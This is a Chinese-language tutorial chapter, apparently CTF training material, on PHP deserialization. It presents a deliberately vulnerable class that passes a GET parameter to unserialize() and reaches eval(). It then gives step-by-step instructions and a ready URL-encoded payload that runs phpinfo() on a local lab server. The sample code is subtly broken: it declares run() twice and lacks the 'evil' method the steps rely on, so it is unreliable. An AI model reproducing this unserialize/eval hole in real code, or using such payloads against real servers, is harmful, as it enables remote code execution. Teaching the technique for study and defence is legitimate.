# 第17章：反序列化例题讲解

# 例题讲解

<?php
# 显示文件内容
show_source(__FILE__);
# 不报错
error_reporting(0);
class DEMO{
	public $func;
    public $arg;
    public function safe(){
        echo $this->arg;
    }
    public function run(){
        # 按php执行arg的值
        eval($this->arg);
    }
    public function run(){
        # this表示对象自己，func属性值给this，然后把总体给this
        $this->{$this->func}();
    }
    public function __construct(){
        $this->func = 'evil';
    }   
}
# GET方式传一个参数a，反序列化传给obj
$obj=unserialize($_GET['a']);
# 执行obj
$obj->run();
?>

反序列化题目做题步骤：

  1. 复制源代码到本地

  2. 注释掉和属性无关的内容

    跟属性相关的只有

    public $func;
public $arg;
    1
    2

  3. 根据题目需要，给属性赋值

    应该会先执行$this->func，所以把func赋值成evil

    public $func="evil";
public $arg="phpinfo();";
    1
    2

  4. 生成序列化数据，通常要urlencode

    $d = new DEMO;
echo urlencode(serialize($d));
    1
    2

  5. 传递数据到服务器（攻击目标）

    使用HackBar传一个Get请求

    http://127.0.0.1:8080/unserialize/demo.php?a=O%3A4%3A%22DEMO%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A4%3A%22evil%22%3Bs%3A3%3A%22arg%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D
